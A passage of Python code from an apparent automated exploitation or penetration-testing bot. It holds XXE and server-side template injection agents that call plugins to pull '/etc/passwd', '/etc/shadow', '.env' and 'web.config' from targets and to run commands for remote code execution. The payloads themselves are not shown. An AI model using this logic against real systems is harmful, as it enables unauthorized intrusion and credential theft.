                    'files': ['/etc/passwd', '/etc/shadow', 'web.config', '.env']
                })
                
                if response.success:
                    exploit_result['success'] = True
                    exploit_result['evidence'] = response.details
                    exploit_result['impact_proof'] = f"Extracted {len(response.details.get('files', []))} sensitive files"
                    exploit_result['impact_score'] = 7.5
                    exploit_result['payload_used'] = payload_obj
                    break
        else:
            response = self.bot.execute_plugin('XXEExploitPlugin', {
                'target': vuln['endpoint'],
                'parsers': vuln['parsers'],
                'extract_files': not safe_mode,
                'files': ['/etc/passwd', '/etc/shadow', 'web.config', '.env']
            })
            
            if response.success:
                exploit_result['success'] = True
                exploit_result['evidence'] = response.details
                exploit_result['impact_proof'] = f"Extracted {len(response.details.get('files', []))} sensitive files"
                exploit_result['impact_score'] = 7.5
        
        return exploit_result


class SSTIAgent:
    """Specialized agent for Server-Side Template Injection"""
    
    def __init__(self, bot):
        self.bot = bot
        
    def scan(self, endpoint: str, strategy: ExploitationStrategy) -> Dict:
        """Scan for SSTI vulnerabilities"""
        result = {
            'type': 'ssti',
            'endpoint': endpoint,
            'confidence': 0.0,
            'template_engine': None
        }
        
        response = self.bot.execute_plugin('SSTITestPlugin', {
            'target': endpoint,
            'identify_engine': True,
            'test_execution': True
        })
        
        if response.success and response.details.get('ssti_confirmed'):
            result['confidence'] = 0.95
            result['template_engine'] = response.details.get('engine')
        
        return result if result['confidence'] > 0 else None
    
    def exploit(self, vuln: Dict, collect_evidence: bool = True, safe_mode: bool = False,
                exploit_payloads: Optional[List] = None) -> Dict:
        """Exploit SSTI for code execution"""
        exploit_result = {
            'success': False,
            'type': 'ssti',
            'endpoint': vuln['endpoint'],
            'evidence': {},
            'impact_proof': None,
            'payload_used': None
        }
        
        response = self.bot.execute_plugin('SSTIExploitPlugin', {
            'target': vuln['endpoint'],
            'engine': vuln['template_engine'],
            'execute_commands': not safe_mode,
            'establish_persistence': False
        })
        
        if response.success:
            exploit_result['success'] = True
            exploit_result['evidence'] = response.details
            exploit_result['impact_proof'] = "Achieved remote code execution via template injection"
            exploit_result['impact_score'] = 9.5
        
        return exploit_result
